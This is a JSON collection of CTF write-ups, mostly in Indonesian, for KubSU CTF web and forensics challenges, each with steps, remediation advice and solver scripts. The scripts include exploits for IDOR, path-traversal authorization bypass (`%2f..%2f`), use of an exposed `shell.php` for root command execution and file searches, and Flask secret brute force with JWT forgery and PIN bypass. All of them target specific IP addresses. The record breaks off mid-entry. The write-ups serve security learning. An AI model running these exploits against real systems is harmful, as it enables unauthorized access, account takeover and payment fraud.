    "problemDescription": "| # | Technique | Detail |\n|---|---|---|\n| 1 | **Zero-Width Steganography** | Flag disisipkan memakai karakter Unicode tak terlihat di antara teks biasa |\n| 2 | **Unicode Obfuscation** | Homoglyph Cyrillic dipakai untuk menyamarkan adanya manipulasi karakter |\n| 3 | **Visual Deception** | Secara kasat mata file tampak seperti manuskrip biasa, padahal payload tersembunyi ada di layer karakter |\n\n---",
    "tools": [
      "file",
      "sed",
      "xxd",
      "Python — ekstraksi dan decoding bitstream zero-width"
    ],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> We are given a text file `ancient_note.txt` — supposedly an ancient manuscript from an abandoned library. The text is in English, philosophical reflections on the search for hidden truth.\n\n**Artifact:** `ancient_note.txt`\n\n---"
      },
      {
        "title": "Step 1 — Inspect the File",
        "content": "Karena challenge hanya memberi satu file teks, langkah pertama yang paling masuk akal adalah memeriksa isi file dan karakteristik dasarnya.\n\nCommand yang dipakai:\n\n\n\nHasil penting yang langsung terlihat:\n\n- File bertipe UTF-8 text dengan line ending CRLF\n- Saat dibuka biasa, teks terlihat seperti narasi bahasa Inggris yang normal\n- Namun di output hex terlihat banyak byte `e2 80 8b` dan `e2 80 8c`\n\nKedua byte sequence itu adalah:\n\n- `U+200B` → Zero Width Space\n- `U+200C` → Zero Width Non-Joiner\n\nIni indikator kuat bahwa flag kemungkinan disisipkan lewat karakter tak terlihat.",
        "code": "file ancient_note.txt\nsed -n '1,200p' ancient_note.txt\nxxd -g 1 ancient_note.txt | sed -n '1,80p'"
      },
      {
        "title": "Step 2 — Notice the Decoy Layer",
        "content": "Di bagian kutipan tengah juga ada beberapa huruf yang terlihat normal tetapi sebenarnya memakai Unicode homoglyph dari alfabet Cyrillic, misalnya:\n\n- `о` bukan `o`\n- `е` bukan `e`\n- `І` bukan `I`\n- `і` bukan `i`\n\nLapisan ini tampaknya berfungsi sebagai pengalih perhatian atau petunjuk bahwa file memang memanfaatkan karakter Unicode yang sulit dilihat secara visual.\n\n---"
      },
      {
        "title": "Step 3 — Extract the Zero-Width Characters",
        "content": "Setelah semua karakter zero-width dikumpulkan, dua karakter itu dipetakan menjadi bit:\n\n- `U+200B` → `0`\n- `U+200C` → `1`\n\nLalu bitstream dibaca per 8 bit sebagai ASCII.\n\nScript Python singkat:\n\n\n\nOutput:",
        "code": "from pathlib import Path\n\ntext = Path(\"ancient_note.txt\").read_text(encoding=\"utf-8\")\nhidden = [ch for ch in text if ch in (\"\\u200b\", \"\\u200c\")]\nbits = \"\".join(\"0\" if ch == \"\\u200b\" else \"1\" for ch in hidden)\nflag = \"\".join(chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8))\nprint(flag)"
      },
      {
        "title": "Step 4 — Validate the Result",
        "content": "Hasil decode langsung membentuk format flag yang valid dan utuh:\n\n\n\nTidak diperlukan brute force, reversing tambahan, ataupun asumsi manual terhadap isi flag.\n\n---",
        "code": "KubSTU{h1dd3n_truth_b3tw33n}"
      },
      {
        "title": "Remediation",
        "content": "1. Normalisasi Unicode saat memproses dokumen dari sumber tidak tepercaya\n2. Gunakan deteksi karakter zero-width dalam pipeline inspeksi file\n3. Tampilkan metadata atau representasi escaped saat melakukan audit teks sensitif\n\n---"
      },
      {
        "title": "Attack Flow",
        "content": "",
        "code": "Open ancient_note.txt\n      |\n      v\nInspect visible text and raw bytes\n      |\n      v\nFind repeated U+200B and U+200C characters\n      |\n      v\nMap U+200B -> 0 and U+200C -> 1\n      |\n      v\nSplit bitstream into 8-bit ASCII bytes\n      |\n      v\nDecode result -> KubSTU{h1dd3n_truth_b3tw33n}"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "from pathlib import Path\r\n\r\n\r\ndef extract_flag(path: str = \"ancient_note.txt\") -> str:\r\n    text = Path(path).read_text(encoding=\"utf-8\")\r\n    hidden = [ch for ch in text if ch in (\"\\u200b\", \"\\u200c\")]\r\n    bits = \"\".join(\"0\" if ch == \"\\u200b\" else \"1\" for ch in hidden)\r\n    return \"\".join(chr(int(bits[i : i + 8], 2)) for i in range(0, len(bits), 8))\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    print(extract_flag())"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{h1dd3n_truth_b3tw33n}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsuctf-web-capyagrorescue",
    "title": "CTF — CapyAgro Crop Rescue",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "KubsCTF",
    "tags": [],
    "description": "**Event:** KubSU CTF  \n**Category:** Web  \n**Difficulty:** Easy  \n**Flag:** `KubSTU(Sav3d_th3_CapyArg0S3ct0r)`",
    "problemDescription": "| # | Vulnerability | Detail |\n|---|---|---|\n| 1 | **Client-Side Secret Exposure** | API key `test_key_123` ditanam langsung di file JavaScript publik |\n| 2 | **IDOR / Broken Access Control** | User biasa bisa membaca ID internal sektor CapyAgro lalu memanggil endpoint adjust untuk sektor yang bukan miliknya |\n| 3 | **Business Logic Flaw** | Endpoint monitoring yang seharusnya read-only malah membocorkan ID yang bisa langsung dipakai untuk write action |\n\n---",
    "tools": [
      "curl",
      "Python"
    ],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> In experimental greenhouse No. 3 on the territory of CapyAgro, the control system has failed. Staff engineers cannot access the control panel. Plants are dying. As external auditors, you need to find a way to regain control of the system and return the parameters to normal.\n\n**URL:** `http://45.146.165.92`\n\nMirror:\n- `http://155.212.186.67`\n- `http://62.113.103.24`\n\n---"
      },
      {
        "title": "Step 1 — Inspect the Frontend Assets",
        "content": "Halaman utama menampilkan aplikasi Flask sederhana dengan fitur login dan register. File JavaScript publik di `/static/config.js` langsung membocorkan konfigurasi API:\n\n\n\nDari sini langsung terlihat:\n- ada API key hardcoded di sisi client: `test_key_123`\n- ada endpoint untuk melihat dan mengubah sektor\n- ada endpoint low-level `raw_command`, walau akhirnya tidak diperlukan",
        "code": "window.API_CONFIG = {\n    KEY: 'test_key_123',\n    ENDPOINT: '/api',\n    ENDPOINTS: {\n        sector: (id) => `/api/sector/${id}`,\n        sectorStatus: (number) => `/api/v1/sectors/${number}/status`,\n        adjustSector: (id) => `/api/sector/${id}/adjust`,\n        rawCommand: '/api/v1/raw_command'\n    }\n};"
      },
      {
        "title": "Step 2 — Register and Log In",
        "content": "Setelah membuat akun biasa dan login, aplikasi mengarahkan user ke `/dashboard`. Dashboard ini menampilkan sektor milik user, tetapi JavaScript halaman tersebut juga memperlihatkan bahwa setiap operasi memakai ID numerik internal:\n\n\n\nIni menarik karena ID yang dipakai backend bukan sekadar nomor sektor 1, 2, 3, melainkan primary key internal.",
        "code": "<form onsubmit=\"adjustSector(event, 57)\">\n<form onsubmit=\"adjustSector(event, 58)\">\n<form onsubmit=\"adjustSector(event, 59)\">"
      },
      {
        "title": "Step 3 — Check CapyAgro Monitoring",
        "content": "Halaman `/capyagro` bisa diakses oleh user biasa dan mengklaim bahwa aksesnya hanya untuk monitoring. Di sana ada petunjuk penting bahwa ID internal bisa dipakai langsung ke endpoint adjust:\n\n\n\nSelain itu ada endpoint yang membocorkan daftar sektor CapyAgro:\n\n\n\nContoh respons:\n\n\n\nRespons ini membocorkan semua yang diperlukan:\n- sektor CapyAgro yang rusak adalah `sector_number: 4`\n- ID internal yang bisa dimodifikasi adalah `id: 70`\n- nilai saat ini berada di luar ambang aman: `temp=30`, `humidity=45`\n\n---",
        "code": "<p><em>Используйте эти ID для управления через API /api/sector/{id}/adjust</em></p>"
      },
      {
        "title": "Step 4 — Test the Adjust Endpoint Against CapyAgro Sector",
        "content": "Bug utamanya adalah endpoint penyesuaian tidak membatasi kepemilikan sektor. User biasa tetap bisa mengubah sektor CapyAgro selama mengetahui ID internalnya.\n\nRequest eksploit:\n\n\n\nNilai `24` dan `60` dipilih karena berada di rentang aman yang terlihat konsisten dari dashboard sektor normal.\n\nResponse:\n\n\n\nDi titik ini flag langsung diberikan oleh backend.\n\n---",
        "code": "curl -s http://45.146.165.92/api/sector/70/adjust \\\n  -X POST \\\n  -H 'Content-Type: application/json' \\\n  -H 'X-API-Key: test_key_123' \\\n  -b 'session=<logged-in-session>' \\\n  -d '{\"temp\":24,\"humidity\":60}'"
      },
      {
        "title": "Remediation",
        "content": "1. **Jangan simpan API key di frontend** — pindahkan autentikasi sensitif ke server-side\n2. **Terapkan ownership check di backend** — `/api/sector/<id>/adjust` harus memastikan sektor benar-benar dimiliki user yang sedang login\n3. **Pisahkan endpoint monitoring dan kontrol** — data monitoring tidak boleh membocorkan identifier internal yang bisa dipakai untuk operasi tulis\n4. **Gunakan identifier publik yang aman** — jangan ekspos primary key internal tanpa lapisan otorisasi\n\n---"
      },
      {
        "title": "Attack Flow",
        "content": "",
        "code": "Open main page\n      |\n      v\nRead /static/config.js\n  -> find API key: test_key_123\n  -> find interesting endpoints\n      |\n      v\nRegister and login as normal user\n      |\n      v\nOpen /capyagro and query /api/capyagro/sectors\n  -> leak internal sector ID for CapyAgro\n      |\n      v\nPOST /api/sector/<internal_id>/adjust\n  with safe values temp=24 humidity=60\n      |\n      v\nBackend marks CapyAgro sector as restored\n      |\n      v\nFlag returned in JSON response"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport sys\r\nimport uuid\r\n\r\nimport requests\r\n\r\n\r\nBASE_URL = \"http://45.146.165.92\"\r\nAPI_KEY = \"test_key_123\"\r\nSAFE_TEMP = 24\r\nSAFE_HUMIDITY = 60\r\n\r\n\r\ndef main() -> int:\r\n    session = requests.Session()\r\n\r\n    username = f\"u{uuid.uuid4().hex[:8]}\"\r\n    email = f\"{username}@a.a\"\r\n    password = \"Passw0rd!\"\r\n\r\n    register_response = session.post(\r\n        f\"{BASE_URL}/register\",\r\n        data={\"username\": username, \"email\": email, \"password\": password},\r\n        timeout=10,\r\n    )\r\n    register_response.raise_for_status()\r\n\r\n    login_response = session.post(\r\n        f\"{BASE_URL}/login\",\r\n        data={\"username\": username, \"password\": password},\r\n        timeout=10,\r\n        allow_redirects=True,\r\n    )\r\n    login_response.raise_for_status()\r\n\r\n    if \"/dashboard\" not in login_response.url:\r\n        print(\"login failed\", file=sys.stderr)\r\n        return 1\r\n\r\n    headers = {\r\n        \"X-API-Key\": API_KEY,\r\n        \"Content-Type\": \"application/json\",\r\n    }\r\n\r\n    sectors_response = session.get(\r\n        f\"{BASE_URL}/api/capyagro/sectors\",\r\n        headers=headers,\r\n        timeout=10,\r\n    )\r\n    sectors_response.raise_for_status()\r\n    sectors = sectors_response.json().get(\"sectors\", [])\r\n    if not sectors:\r\n        print(\"no CapyAgro sectors returned\", file=sys.stderr)\r\n        return 1\r\n\r\n    sector_id = sectors[0][\"id\"]\r\n    adjust_response = session.post(\r\n        f\"{BASE_URL}/api/sector/{sector_id}/adjust\",\r\n        headers=headers,\r\n        json={\"temp\": SAFE_TEMP, \"humidity\": SAFE_HUMIDITY},\r\n        timeout=10,\r\n    )\r\n    adjust_response.raise_for_status()\r\n\r\n    payload = adjust_response.json()\r\n    flag = payload.get(\"flag\")\r\n    if not flag:\r\n        print(\"flag not found in response\", file=sys.stderr)\r\n        print(payload, file=sys.stderr)\r\n        return 1\r\n\r\n    print(flag)\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "```text\nKubSTU(Sav3d_th3_CapyArg0S3ct0r)\n```\n\n---",
    "lessonsLearned": ""
  },
  {
    "id": "kubsuctf-web-capybaraadminportal",
    "title": "Capybara Admin Portal",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "KubsCTF",
    "tags": [],
    "description": "Challenge ini kelihatannya sederhana di permukaan: kita dikasih satu akun biasa dan sebuah ID admin yang menyimpan secret. Setelah login sebagai user biasa, aplikasi memaksa masuk ke halaman 2FA. Tapi 2FA ini ternyata cuma hiasan frontend, karena backend tetap menerima token JWT dari hasil login pertama.",
    "problemDescription": "Challenge ini kelihatannya sederhana di permukaan: kita dikasih satu akun biasa dan sebuah ID admin yang menyimpan secret. Setelah login sebagai user biasa, aplikasi memaksa masuk ke halaman 2FA. Tapi 2FA ini ternyata cuma hiasan frontend, karena backend tetap menerima token JWT dari hasil login pertama.",
    "tools": [],
    "analysis": "Halaman login melakukan request ke endpoint berikut:\n\n```http\nPOST /login\nContent-Type: application/json\n\n{\"username\":\"angel\",\"password\":\"princess\"}\n```\n\nResponse login memberi JWT dan mengarahkan user ke `/2fa`.\n\nDi halaman `/2fa`, ada petunjuk penting di JavaScript:\n\n- console log membocorkan endpoint internal `POST /admin/account/<id>`\n- ada fungsi `getAccountData(id)` yang mengirim body `{\"action\":\"fetch_secure_data\"}`\n\nArtinya, walaupun 2FA belum selesai, browser tetap bisa mengakses endpoint admin account selama punya token JWT dari login biasa.",
    "solution": [
      {
        "title": "Informasi awal",
        "content": "- Username: `angel`\n- Password: `princess`\n- ID akun biasa: `679202372644`\n- ID admin target: `239716013`"
      },
      {
        "title": "Uji akses biasa",
        "content": "Request normal ke account milik sendiri:\n\n\n\nResponse memberitahu kalau user `angel` tidak berhak melihat flag, dan flag ada di akun `239716013`.\n\nKalau langsung ganti path menjadi:\n\n\n\nbackend membalas `403 Forbidden`. Jadi ada pengecekan bahwa user biasa tidak boleh membuka account lain.",
        "code": "POST /admin/account/679202372644\nAuthorization: Bearer <jwt_user_biasa>\nContent-Type: application/json\n\n{\"action\":\"fetch_secure_data\"}"
      },
      {
        "title": "Mencari bypass",
        "content": "Karena route yang dipakai berbasis path, saya fokus ke manipulasi path. Saya coba beberapa variasi encoding dan traversal pada segmen ID.\n\nPayload yang berhasil:\n\n\n\nAtau bentuk lain yang juga lolos:\n\n\n\nIni menunjukkan ada mismatch antara proses validasi dan proses resolusi path:\n\n- kemungkinan validasi hanya mengecek bahwa path diawali dengan user ID milik kita\n- tapi resolver route/backend kemudian menormalkan `%2f..%2f` menjadi traversal ke resource lain\n\nHasilnya, request terlihat aman saat dicek, tetapi akhirnya dibaca sebagai akun admin target.",
        "code": "/admin/account/679202372644%2f..%2f239716013"
      },
      {
        "title": "Exploit final",
        "content": "Request final:\n\n\n\nResponse:",
        "code": "POST /admin/account/679202372644%2f..%2f239716013\nAuthorization: Bearer <jwt_user_biasa>\nContent-Type: application/json\n\n{\"action\":\"fetch_secure_data\"}"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport sys\r\nimport requests\r\n\r\n\r\nTARGETS = [\r\n    \"http://155.212.132.248\",\r\n    \"http://83.222.27.64\",\r\n]\r\nUSERNAME = \"angel\"\r\nPASSWORD = \"princess\"\r\nADMIN_ID = \"239716013\"\r\nTRAVERSAL_PAYLOAD = \"679202372644%2f..%2f239716013\"\r\n\r\n\r\ndef login(session: requests.Session, base_url: str) -> dict:\r\n    response = session.post(\r\n        f\"{base_url}/login\",\r\n        json={\"username\": USERNAME, \"password\": PASSWORD},\r\n        timeout=10,\r\n    )\r\n    response.raise_for_status()\r\n    data = response.json()\r\n    if \"token\" not in data:\r\n        raise RuntimeError(\"Login berhasil tapi token tidak ditemukan\")\r\n    return data\r\n\r\n\r\ndef fetch_flag(session: requests.Session, base_url: str, token: str) -> str:\r\n    response = session.post(\r\n        f\"{base_url}/admin/account/{TRAVERSAL_PAYLOAD}\",\r\n        headers={\r\n            \"Authorization\": f\"Bearer {token}\",\r\n            \"Content-Type\": \"application/json\",\r\n        },\r\n        json={\"action\": \"fetch_secure_data\"},\r\n        timeout=10,\r\n    )\r\n    response.raise_for_status()\r\n    data = response.json()\r\n    flag = data.get(\"data\", \"\")\r\n    if not flag:\r\n        raise RuntimeError(f\"Respons tidak memuat data flag: {data}\")\r\n    return flag\r\n\r\n\r\ndef main() -> int:\r\n    for base_url in TARGETS:\r\n        try:\r\n            session = requests.Session()\r\n            login_data = login(session, base_url)\r\n            token = login_data[\"token\"]\r\n            flag = fetch_flag(session, base_url, token)\r\n            print(f\"[+] Target   : {base_url}\")\r\n            print(f\"[+] User ID  : {login_data.get('user_id')}\")\r\n            print(f\"[+] Admin ID : {ADMIN_ID}\")\r\n            print(f\"[+] Flag     : {flag}\")\r\n            return 0\r\n        except Exception as exc:\r\n            print(f\"[-] Gagal di {base_url}: {exc}\", file=sys.stderr)\r\n    return 1\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{c4pyb4r4_p4th_tr4v3rs4l_m4st3r}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsuctf-web-capyblog",
    "title": "CTF — CapyBlog",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "KubsCTF",
    "tags": [],
    "description": "**Event:** KubSU CTF  \n**Category:** Web  \n**Difficulty:** Medium  \n**Flag:** `KubSTU(capybl0g_php_d3s3r1al1zat10n)`",
    "problemDescription": "| # | Vulnerability | Detail |\n|---|---|---|\n| 1 | **Verbose Error Disclosure** | Type juggling via array parameters membocorkan path internal dan nama file PHP |\n| 2 | **Exposed Hidden Endpoint** | `shell.php` tidak ter-link dari UI tetapi tetap dapat diakses publik |\n| 3 | **Remote Command Execution** | `shell.php` mengeksekusi parameter `c` langsung ke `system()` tanpa autentikasi |\n| 4 | **Privilege Misconfiguration** | Command dieksekusi sebagai `root`, memperparah dampak RCE |\n| 5 | **Sensitive File in Webroot** | Flag disimpan di `/var/www/html/data/flag.txt`, lokasi yang dekat dengan aset publik |\n\n---",
    "tools": [
      "curl",
      "ffuf",
      "Python"
    ],
    "analysis": "Selanjutnya saya cek direktori webroot:\n\n```bash\ncurl \"http://193.42.127.24/shell.php?c=ls%20-la%20/var/www/html\"\n```\n\nTerlihat file dan direktori berikut:\n\n```txt\nauth.php\nbackup/\nclasses.php\nconfig.php\ndata/\nindex.php\nlogin.php\nregister.php\nshell.php\nutils.php\n```\n\nLalu saya cari file yang berpotensi menyimpan flag:\n\n```bash\ncurl \"http://193.42.127.24/shell.php?c=find%20/root%20/home%20/var/www%20/etc%20-maxdepth%204%20-type%20f%202%3E/dev/null%20%7C%20grep%20-Ei%20%22flag%7Csecret%7Cctf%7Ckubsu%22\"\n```\n\nHasil pentingnya:\n\n```txt\n/var/www/html/data/flag.txt\n```",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> Lately, the theme change is buggy. Maybe it's because of the bugs? Did the site work the same way before?\n\n**URL:** `http://193.42.127.24`  \n**Mirror:** `http://159.194.209.128`  \n**Mirror:** `http://159.194.199.71`\n\n---"
      },
      {
        "title": "Step 1 — Check the Main Page and Basic Behavior",
        "content": "Halaman utama menampilkan blog sederhana berbasis PHP dengan fitur:\n\n- ganti tema lewat `?set_theme=dark`\n- login dan register\n- komentar pada tiap post\n\nDari header dan error handling awal kelihatan aplikasi berjalan di:\n\n- `Apache/2.4.66 (Debian)`\n- `PHP/8.2.30`\n\nSaat `set_theme` diisi nilai array seperti:\n\n\n\nserver membocorkan stack trace:\n\n\n\nIni berguna karena mengonfirmasi path aplikasi di server: `/var/www/html/`.",
        "code": "curl \"http://193.42.127.24/?set_theme[]=dark\""
      },
      {
        "title": "Step 2 — Trigger More Errors to Map Internal Files",
        "content": "Input array juga bisa dipakai pada login dan register:\n\n\n\nServer kembali membocorkan informasi internal:\n\n\n\nDengan teknik yang sama pada komentar:\n\n\n\nmuncul file helper lain:\n\n\n\nPada tahap ini sudah terlihat struktur aplikasi:\n\n- `index.php`\n- `login.php`\n- `register.php`\n- `auth.php`\n- `utils.php`\n- `config.php`",
        "code": "curl -X POST http://193.42.127.24/login.php \\\n  -d \"username[]=a&password=b\""
      },
      {
        "title": "Step 3 — Content Discovery",
        "content": "Dari `robots.txt` terlihat ada petunjuk:\n\n\n\nItu menunjukkan ada versi lama atau file cadangan, jadi saya lanjut enumerasi file yang tidak terlihat dari UI.  \nSaat melakukan discovery terhadap file `.php`, ditemukan endpoint yang tidak ter-link dari aplikasi:\n\n\n\nMembuka endpoint itu tanpa parameter langsung menghasilkan error sangat jelas:\n\n\n\nDari sini langsung kelihatan implementasinya secara praktis setara dengan:\n\n\n\nArtinya ada **unauthenticated command execution**.\n\n---",
        "code": "User-agent: *\nDisallow: /backup/"
      },
      {
        "title": "Step 4 — Confirm RCE",
        "content": "Tes sederhana:\n\n\n\nResponse:\n\n\n\nJadi command dieksekusi sebagai `root`.",
        "code": "curl \"http://193.42.127.24/shell.php?c=id\""
      },
      {
        "title": "Remediation",
        "content": "1. Hapus seluruh file debug, helper, dan endpoint eksperimen seperti `shell.php` sebelum deploy.\n2. Matikan `display_errors` di production agar stack trace dan path internal tidak bocor ke user.\n3. Jangan pernah meneruskan input user langsung ke `system()`, `exec()`, `shell_exec()`, atau fungsi sejenis.\n4. Jalankan web server dengan user berprivilege minimum, bukan `root`.\n5. Pisahkan data sensitif dari webroot dan batasi permission filesystem dengan benar.\n\n---"
      },
      {
        "title": "Attack Flow",
        "content": "",
        "code": "Open blog\n   |\n   v\nTrigger PHP errors with array parameters\n   |\n   v\nLeak internal paths and file names:\nindex.php, auth.php, utils.php, config.php\n   |\n   v\nEnumerate hidden PHP endpoints\n   |\n   v\nFind /shell.php\n   |\n   v\nAccess /shell.php without parameter\n   |\n   v\nObserve system($_GET[\"c\"]) style behavior\n   |\n   v\nRun commands with ?c=\n   |\n   v\nFind /var/www/html/data/flag.txt\n   |\n   v\nRead flag with cat"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport sys\r\nimport urllib.parse\r\n\r\nimport requests\r\n\r\n\r\nTARGETS = [\r\n    \"http://193.42.127.24\",\r\n    \"http://159.194.209.128\",\r\n    \"http://159.194.199.71\",\r\n]\r\n\r\nFLAG_RE = re.compile(r\"KubSTU\\([^)]+\\)\")\r\n\r\n\r\ndef run_cmd(base_url: str, command: str) -> str:\r\n    url = f\"{base_url}/shell.php?c={urllib.parse.quote(command, safe='')}\"\r\n    response = requests.get(url, timeout=15, verify=False)\r\n    response.raise_for_status()\r\n    return response.text\r\n\r\n\r\ndef find_shell_target() -> str:\r\n    for base_url in TARGETS:\r\n        try:\r\n            response = requests.get(f\"{base_url}/shell.php\", timeout=10, verify=False)\r\n        except requests.RequestException:\r\n            continue\r\n        if \"Undefined array key \\\"c\\\"\" in response.text and \"system()\" in response.text:\r\n            return base_url\r\n    raise RuntimeError(\"shell.php not found on any target\")\r\n\r\n\r\ndef main() -> int:\r\n    requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]\r\n\r\n    try:\r\n        base_url = find_shell_target()\r\n        output = run_cmd(base_url, \"cat /var/www/html/data/flag.txt\")\r\n    except Exception as exc:\r\n        print(f\"[!] exploit failed: {exc}\", file=sys.stderr)\r\n        return 1\r\n\r\n    match = FLAG_RE.search(output)\r\n    if not match:\r\n        print(\"[!] flag not found\", file=sys.stderr)\r\n        print(output)\r\n        return 1\r\n\r\n    print(match.group(0))\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "```txt\nKubSTU(capybl0g_php_d3s3r1al1zat10n)\n```\n\n---",
    "lessonsLearned": ""
  },
  {
    "id": "kubsuctf-web-capycapybank1",
    "title": "CAPY-CAPY Bank 1",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "KubsCTF",
    "tags": [],
    "description": "Writeup for challenge CAPY-CAPY Bank 1",
    "problemDescription": "Challenge ini bisa diselesaikan tanpa tahu password maupun PIN Mikhail.\n\nMasalah utamanya ada dua:\n\n1. `Flask SECRET_KEY` lemah dan bisa di-bruteforce dari cookie `session`.\n2. Secret yang sama juga dipakai untuk menandatangani JWT `access_token_cookie`.\n\nBegitu secret diketahui, kita bisa:\n\n- forge JWT untuk login sebagai `mgalankov@4274`\n- bypass PIN dengan memalsukan isi cookie `session` bagian `pending_signatures`\n\nSetelah itu tinggal masuk ke akun Mikhail, buka histori transaksi/receipt, dan ambil artefak pembelian flag yang valid.",
    "tools": [],
    "analysis": "Halaman login membedakan dua kondisi:\n\n- `Неверный пароль...` kalau username ada\n- `Пользователь с логином ... не найден...` kalau username tidak ada\n\nDengan ini bisa dipastikan bahwa `mgalankov@4274` memang valid.",
    "solution": [
      {
        "title": "Langkah 3: Bruteforce SECRET_KEY dari Flask session",
        "content": "Cookie `session` Flask bisa didecode sebagian, lalu dipakai buat brute force `SECRET_KEY`.\n\nSecret yang ketemu:\n\n\n\nNilai ini tervalidasi untuk:\n\n- signature cookie Flask `session`\n- signature JWT `access_token_cookie`",
        "code": "facetoface"
      },
      {
        "title": "Langkah 4: Forge JWT untuk jadi Mikhail",
        "content": "Karena secret JWT sama, kita bisa bikin token sendiri:\n\n- `username = mgalankov@4274`\n- `sub = 4`\n\n`sub` didapat dengan brute-force ringan ke `/dashboard` menggunakan JWT palsu sampai ketemu kombinasi yang valid.  \nTernyata Mikhail punya `sub=4` di node-node yang diuji.\n\nSetelah itu dashboard Mikhail bisa diakses langsung.\n\nInfo penting dari akun Mikhail:\n\n- account: `ACC004`\n- email: `mgalankov@example.com`\n- akses premium ke `/flag_shop`"
      },
      {
        "title": "Langkah 5: Decode mekanisme bypass PIN",
        "content": "Saat user normal meminta signature lewat `/api/get_signature`, server mengirim cookie `session` baru.\n\nIsi session itu ternyata menyimpan struktur seperti ini:\n\n\n\nArtinya validasi final `/transfer` tidak benar-benar bergantung pada PIN secara server-side yang terpisah; dia percaya pada state di cookie `session`.\n\nKarena secret Flask sudah diketahui, cookie ini bisa dipalsukan penuh.",
        "code": "{\n  \"pending_signatures\": {\n    \"<signature>\": {\n      \"amount\": \"...\",\n      \"description\": \"...\",\n      \"expires_at\": ...,\n      \"issued_at\": ...,\n      \"timestamp\": ...,\n      \"to_account\": \"...\",\n      \"user_id\": ...\n    }\n  }\n}"
      },
      {
        "title": "Langkah 6: Bypass PIN",
        "content": "Dengan session palsu yang berisi `pending_signatures` buatan sendiri, transaksi bisa langsung dikonfirmasi ke `/transfer` selama field ini konsisten:\n\n- `to_account`\n- `amount`\n- `description`\n- `transaction_timestamp`\n- `transaction_signature`\n- `user_id`\n\nUntuk akun Mikhail ini berarti kita bisa:\n\n- beli produk dari `/flag_shop`\n- konfirmasi transaksi tanpa tahu PIN Mikhail"
      },
      {
        "title": "Inti kerentanannya",
        "content": "Kalau disingkat:\n\n- cookie Flask bisa di-forge karena secret lemah\n- JWT juga bisa di-forge dengan secret yang sama\n- PIN bisa dibypass karena approval state disimpan client-side dalam cookie yang ditandatangani lemah\n\nItu memberi full account takeover + payment authorization bypass."
      },
      {
        "title": "Catatan",
        "content": "Aku sengaja simpan langkah di atas dalam bentuk yang praktis dan bisa direproduksi lagi dengan cepat, tanpa bikin penjelasannya terlalu kaku.  \nKalau nanti mau, chain ini bisa dibungkus jadi satu script otomatis penuh."
      }
    ],
    "terminalOutputs": [],
    "flag": "Dari dashboard/receipt Mikhail di node challenge pertama, ada transaksi sukses ke `FLAG_SHOP` dengan deskripsi:\n\n```text\nПокупка: Флаг от CTF задания\n```\n\nReceipt yang relevan:\n\n- `/receipt/1906`\n\nDi receipt itu ada `Токен offer` yang terlihat sebagai artefak valid hasil pembelian flag:\n\n```text\n6MjZHrCcebxsRUV44LtTlmJ12mQHVgkI",
    "lessonsLearned": ""
  },
  {
    "id": "kubsuctf-web-capycapybank2",
    "title": "🦫 CAPY-CAPY Bank 2 — CTF",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "KubsCTF",
    "tags": [],
    "description": "**Event:** KubSTU CTF  \n**Challenge:** CAPY-CAPY Bank 2 (Web)  \n**Flag:** `KubSTU{p0dm3n4_p4r4m3tr0v_1zm3n1l4_summu_tr4nz4kts11}`  \n**Difficulty:** Medium-Hard  \n**Vulnerability Class:** Broken Object Level Authorization (IDOR) + Cross-User Signature Abuse + PIN Bypass",
    "problemDescription": "**Event:** KubSTU CTF  \n**Challenge:** CAPY-CAPY Bank 2 (Web)  \n**Flag:** `KubSTU{p0dm3n4_p4r4m3tr0v_1zm3n1l4_summu_tr4nz4kts11}`  \n**Difficulty:** Medium-Hard  \n**Vulnerability Class:** Broken Object Level Authorization (IDOR) + Cross-User Signature Abuse + PIN Bypass\n\n---",
    "tools": [],
    "analysis": "Akses `/flag_shop` dengan JWT Mikhail:\n\n```bash\ncurl -s http://185.225.34.187/flag_shop \\\n  --cookie \"access_token_cookie=$MIKHAIL_JWT\"\n```\n\n**Temuan penting:**\n- Produk \"Флаг от CTF задания\" harga 1000 ₽\n- Butuh **Offer Token** dari Telegram bot: `@flagi_and_bagi_for_kubstu2bot`\n- Form POST ke `/buy_flag` dengan field: `product_id`, `token`\n\n---",
    "solution": [
      {
        "title": "📖 Deskripsi Soal",
